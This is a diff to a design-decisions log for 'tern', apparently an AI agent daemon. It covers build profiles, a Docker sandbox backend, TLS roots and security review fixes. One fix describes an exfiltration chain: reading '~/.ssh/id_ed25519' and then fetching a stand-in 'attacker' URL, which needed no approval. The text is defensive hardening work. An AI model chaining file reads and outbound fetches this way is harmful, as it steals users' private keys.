@@ -121,3 +121,37 @@ Choices made where the spec was ambiguous or silent. Newest at the bottom of eac
 - **`tern` attaches to a running daemon** when its socket answers `/v1/health`, otherwise it runs embedded. The pty smoke test checks attach really happened: daemon sessions have source `api`.
 - **Test doubles**: `crates/tern/tests/fixtures/fake_telegram.py` is a stdlib Bot API fake with control endpoints (inject messages and button taps, read what the bot sent) that drops acknowledged updates like Telegram does. The mock provider gained `conversations` (scripts chosen by the first user message), so the chat and the scheduled run can be scripted separately.
 - **Measured**: idle daemon RSS 15.9 MB (target < 30 MB); release binary 14 MB (target < 25 MB).
+
+## M6
+
+- **Two optimized profiles.** `release` uses thin LTO and 16 codegen units, so local builds use every core: about 33 s to rebuild the binary crate on an M4 Max, 17 MB. `dist` (inherits `release`) uses fat LTO and one codegen unit: about 85 s, single-threaded at the end, 14 MB. CI artifacts and releases use `dist`.
+- **Docker backend shells out to the `docker` CLI**; no Docker API client. One long-lived container per workspace, named after a stable hash of the workspace path and labelled `tern.sandbox=1`:
+  - It runs `--init`, mounts the workspace at `/workspace`, runs as the workspace owner's uid:gid, and sleeps until commands are exec'd into it.
+  - A changed image replaces the container.
+  - Each exec records its shell's pid inside the container. On timeout or cancel, that pid is killed with a second `docker exec`, because killing the host-side `docker exec` would leave the command running.
+  - The container has default (bridge) networking; there's no network policy yet.
+  - Tests use a fake `docker` script; a real-daemon test runs in CI on Linux.
+- **Linux TLS roots**: every HTTP client comes from `tern_core::net::http_client()`. On Linux it merges Mozilla's roots (`webpki-root-certs`) into the platform verifier. Without that, a static binary on a system with no CA bundle fails *every* HTTPS request: `rustls-platform-verifier` errors when no system roots load. System roots still work (corporate CAs). rmcp's HTTP transport is given this client instead of its own.
+- **Cross-builds verified locally** with `cargo-zigbuild` and Zig 0.17: both musl targets link statically with Luau's C++. Release assets are `tern-<target>.tar.gz` plus `.sha256`, without the version, so `releases/latest/download/` works for `install.sh`.
+- **`install.sh`** verifies SHA-256 and installs to `~/.local/bin` without sudo. It refuses to run until `TERN_REPO` (or a mirror via `TERN_DOWNLOAD_URL`) is set, because this repository has no published home yet.
+
+### Security review fixes
+
+An independent review of the trust boundaries found these; all are fixed with tests unless noted.
+
+- **Silent exfiltration**: `read_file ~/.ssh/id_ed25519` followed by `http_fetch https://attacker/?d=…` needed no approval. Now reads outside the workspace need approval (like writes). File tools can never write anywhere in `~/.tern` or read `secrets.toml` or the database. `http_fetch` refuses non-public addresses (loopback, RFC 1918, link-local and metadata, CGNAT, ULA, IPv4-mapped forms). It resolves DNS itself and pins the connection to the checked addresses, and follows redirects by hand, checking each hop.
+- **Connector approval vs. what runs**: capabilities came from running the file, so a draft could declare `os.time()`-dependent hosts, or be edited after approval.
+  - Now `connector_test` and `connector_activate` record the source hash and capabilities their policy and summary saw. `call()` runs only if a fresh load matches.
+  - Activation writes exactly the approved bytes and stores `{hash, capabilities}` (kv `lua:approved`). An activated connector whose file or capabilities later differ isn't loaded.
+  - Hand-installed connectors (no record) load as before.
+- **Luau redirects** followed reqwest's default policy to any host, carrying custom headers like `X-Api-Key`. Each connector now has its own client whose redirect policy enforces the same allowlist.
+- **Dangling symlinks**: `write_file x` where `x` is a dangling symlink looked like a new file in the workspace but would create the link's target anywhere. Path resolution now refuses dangling symlinks.
+- **Redaction gaps**: the redaction list was fixed at startup, so env-only secrets first read later were stored unredacted, and connector `ctx.log`/`print` and MCP stderr weren't redacted. `Secrets::get` now records every value it hands out in a set shared by all clones. The journal and those log paths redact against it, plus everything in `secrets.toml`.
+- **"Always" too broad**: approvals now carry `pattern: Option<String>`. Tools can opt out with `Tool::allow_always() -> false`; the connector tools do, and old `*` allowlist entries no longer cover them. Shell commands that run other commands (shells, `env`, `sudo`, `xargs`, `find`, interpreters, `ssh`, `docker`, …) are never offered "always". Every front end hides the option when there's no pattern.
+- **Telegram approvals** could be answered by any paired user from any chat. A tap now counts only in the chat the request was sent to.
+- **Pairing codes** now come from the OS CSPRNG (UUIDv4 bytes, 32-symbol alphabet, unbiased) instead of `fastrand`.
+- **Socket fallback hijack**: a stale `tern.sock` symlink into `/tmp` could point clients at a socket another local user planted.
+  - The fallback now prefers per-user `$XDG_RUNTIME_DIR` or macOS's per-user `$TMPDIR`, then `/tmp/tern-<uid>`.
+  - The uid is the process's real one (owner of a probe file) rather than `$HOME`'s owner.
+  - Clients only follow the link if the target socket and its directory are owned by them and the directory is mode 0700; otherwise they don't attach.
+- **Not reproduced**: the review suspected Luau's C pattern matcher could run past the time limit (catastrophic backtracking). A test shows Luau's interrupt fires inside it too, and the call stops at the limit; the test stays as a regression check.
